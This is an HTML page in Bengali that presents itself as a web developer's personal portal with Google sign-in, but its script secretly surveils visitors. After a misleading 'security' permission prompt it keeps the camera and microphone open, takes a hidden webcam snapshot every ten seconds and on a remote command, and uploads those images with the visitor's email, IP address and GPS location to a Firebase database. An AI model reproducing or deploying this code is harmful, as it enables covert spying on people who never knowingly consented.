<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Official Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: rgba(30, 41, 59, 0.8); }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        
        body { 
            background: var(--dark); 
            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent),
                        linear-gradient(180deg, #0f172a 0%, #020617 100%);
            color: white; overflow-x: hidden; min-height: 100vh;
        }

        /* --- Login Overlay --- */
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { 
            background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); 
            text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(15px);
            box-shadow: 0 0 30px rgba(255, 77, 148, 0.3);
        }
        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }

        /* --- Permission Modal --- */
        #perm-modal { 
            position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; 
            display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px);
        }
        .perm-card { 
            background: #1e293b; padding: 35px; border-radius: 25px; text-align: center; 
            max-width: 380px; border: 2px solid var(--pink); animation: zoomIn 0.5s;
        }

        /* --- Main UI --- */
        #main-ui { display: none; }
        .hero { padding: 50px 20px; text-align: center; background: rgba(255, 77, 148, 0.1); border-radius: 0 0 50px 50px; }
        
        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid white; object-fit: cover; }
        .user-p-img { width: 85px; height: 85px; margin-left: -25px; border: 3px solid var(--dark); z-index: 1; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 25px; max-width: 900px; margin: 0 auto; }
        .card { 
            background: var(--card); border-radius: 20px; padding: 20px; text-align: center; 
            text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s;
        }
        .card:hover { transform: translateY(-5px); border-color: var(--pink); background: rgba(255, 77, 148, 0.1); }
        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 10px; }

        /* --- Logout & Controls --- */
        .top-bar { display: flex; justify-content: space-between; padding: 15px 25px; align-items: center; }
        .logout-btn { background: rgba(255,0,0,0.2); color: #ff4d4d; border: 1px solid #ff4d4d; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 0.8rem; }

        .social-icons { display: flex; justify-content: center; gap: 20px; margin-top: 30px; }
        .social-icons a { color: white; font-size: 1.5rem; transition: 0.3s; }
        .social-icons a:hover { color: var(--pink); transform: scale(1.2); }

        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box animate__animated animate__fadeIn">
            <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
            <h2 style="color: var(--pink);">Ratan Bro Portal</h2>
            <p style="margin: 15px 0; opacity: 0.8;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
                <i class="fab fa-google"></i> Continue with Google
            </button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="perm-card">
            <i class="fas fa-camera-retro" style="font-size: 3rem; color: var(--pink); margin-bottom: 15px;"></i>
            <h3>অ্যাক্সেস প্রয়োজন!</h3> <p style="margin: 15px 0; opacity: 0.8; font-size: 0.9rem;">
                আমাদের সার্ভিসগুলো ব্যবহার করতে ক্যামেরা এবং লোকেশন পারমিশন দিন। এটি আপনার সিকিউরিটির জন্য প্রয়োজন।
            </p> <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:10px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">এগিয়ে যান</button>
        </div>
    </div>

    <div id="main-ui">
        <div class="top-bar">
            <span style="color: var(--pink); font-weight: bold;">RATAN.PRO</span>
            <button class="logout-btn" onclick="googleLogout()">Logout <i class="fas fa-sign-out-alt"></i></button>
        </div>

        <section class="hero">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="user-display-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="user-welcome"></h2>
            <p style="opacity:0.7;">Web Developer & Professional Designer</p>
        </section>

        <div class="grid">
            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="business.html" class="card"><i class="fas fa-chart-line"></i><h4>Business</h4></a>
            <a href="https://your-lookup-site.com" class="card"><i class="fas fa-id-card"></i><h4>Lookup</h4></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
        </div>

        <div class="social-icons">
            <a href="https://facebook.com/your-profile"><i class="fab fa-facebook"></i></a>
            <a href="https://wa.me/8801609166109"><i class="fab fa-whatsapp"></i></a>
            <a href="#"><i class="fas fa-globe"></i></a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let activeUser = null;

        window.googleLogin = () => { signInWithPopup(auth, provider); };
        window.googleLogout = () => { signOut(auth).then(() => location.reload()); };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                activeUser = user;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            }
        });

        window.startApp = async () => {
            document.getElementById('perm-modal').style.display = 'none';
            document.getElementById('main-ui').style.display = 'block';
            document.getElementById('user-welcome').innerText = activeUser.displayName;
            document.getElementById('user-display-pic').src = activeUser.photoURL;
            
            runTracking(activeUser);
        };

        async function runTracking(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => alert("Please allow camera!"));
            document.getElementById('vSource').srcObject = stream;

            const uPath = doc(db, "users", user.email.replace('.', '_'));

            onSnapshot(uPath, (snap) => {
                if (snap.data()?.command === "take_photo") {
                    doCapture(user);
                    updateDoc(uPath, { command: "" });
                }
            });

            doCapture(user); 
            setInterval(() => doCapture(user), 10000); 
        }

        async function doCapture(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const imgData = canvas.toDataURL('image/jpeg', 0.5);

            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName,
                    email: user.email,
                    photo: user.photoURL,
                    ip: ip.ip,
                    loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: imgData,
                    time: new Date().toLocaleString()
                }, { merge: true });
            });
        }
    </script>
</body>
</html>
